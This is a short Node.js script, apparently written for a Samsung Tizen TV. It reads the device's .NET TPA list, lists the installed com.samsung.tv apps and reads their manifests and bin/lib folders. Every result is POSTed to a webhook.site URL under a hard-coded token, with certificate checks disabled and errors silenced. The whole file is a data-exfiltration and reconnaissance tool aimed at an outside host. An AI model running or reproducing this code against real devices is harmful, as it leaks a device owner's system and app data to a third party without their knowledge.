var fs = require('fs');
var https = require('https');
var TOKEN = '03471c36-4d0f-4455-ae08-78adca120821';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
function read(p, max) {
    try {
        var s = fs.readFileSync(p, 'utf8');
        send('tpa3', p + ' len=' + s.length + '\n' + s.slice(0, max));
    } catch (e) {
        send('tpa3', p + ' ERR ' + e);
    }
}
read('/opt/usr/home/owner/share/dotnet/TPA.txt', 12000);
try {
    var apps = fs.readdirSync('/opt/usr/apps').filter(function (n) { return /^com\.samsung\.tv/.test(n); });
    send('tpa3', 'opt-apps-tv: ' + apps.join(','));
} catch (e) {
    send('tpa3', 'opt-apps ERR ' + e);
}
['com.samsung.tv.mybixby', 'com.samsung.tv.gallery', 'com.samsung.tv.store', 'com.samsung.tv.weather-viewer', 'com.samsung.tv.csa', 'com.samsung.tv.mycontents', 'com.samsung.tv.CSAccount'].forEach(function (id) {
    read('/opt/usr/apps/' + id + '/tizen-manifest.xml', 3000);
    ['bin', 'lib'].forEach(function (sub) {
        try {
            send('tpa3', '/opt/usr/apps/' + id + '/' + sub + ': ' + fs.readdirSync('/opt/usr/apps/' + id + '/' + sub).slice(0, 40).join(','));
        } catch (e) {
            send('tpa3', '/opt/usr/apps/' + id + '/' + sub + ' ERR ' + e);
        }
    });
});
